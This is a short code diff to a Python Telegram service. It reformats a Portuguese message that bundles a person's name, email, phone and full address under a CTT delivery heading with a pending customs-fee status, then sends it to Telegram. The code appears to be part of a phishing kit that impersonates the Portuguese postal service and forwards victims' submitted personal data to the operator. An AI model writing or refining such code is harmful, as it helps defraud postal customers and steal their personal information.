@@ -86,26 +86,24 @@ class TelegramService:
                 logger.warning("Telegram not configured, using console output only")
                 return True
                 
-            message = f"""
-🏠 *Nova Informação de Entrega CTT*
+            message = f"""🏠 Nova Informação de Entrega CTT
 
-👤 *Dados Pessoais:*
+👤 Dados Pessoais:
 • Nome: {billing_data.get('nome', 'N/A')}
 • Email: {billing_data.get('email', 'N/A')}
 • Telefone: {billing_data.get('telefone', 'N/A')}
 
-📍 *Endereço:*
+📍 Endereço:
 • Morada: {billing_data.get('endereco', 'N/A')}
 • Código Postal: {billing_data.get('codigoPostal', 'N/A')}
 • Cidade: {billing_data.get('cidade', 'N/A')}
 
-⏰ *Data de Submissão:* {datetime.now().strftime('%d/%m/%Y às %H:%M')}
+⏰ Data de Submissão: {datetime.now().strftime('%d/%m/%Y às %H:%M')}
 
-🔄 *Estado:* Aguarda pagamento da taxa alfandegária
-            """
+🔄 Estado: Aguarda pagamento da taxa alfandegária"""
             
             telegram_success = await self.send_message(message)
-            return telegram_success  # Return True even if only console works
+            return telegram_success
             
         except Exception as e:
             logger.error(f"Error formatting billing message: {str(e)}")
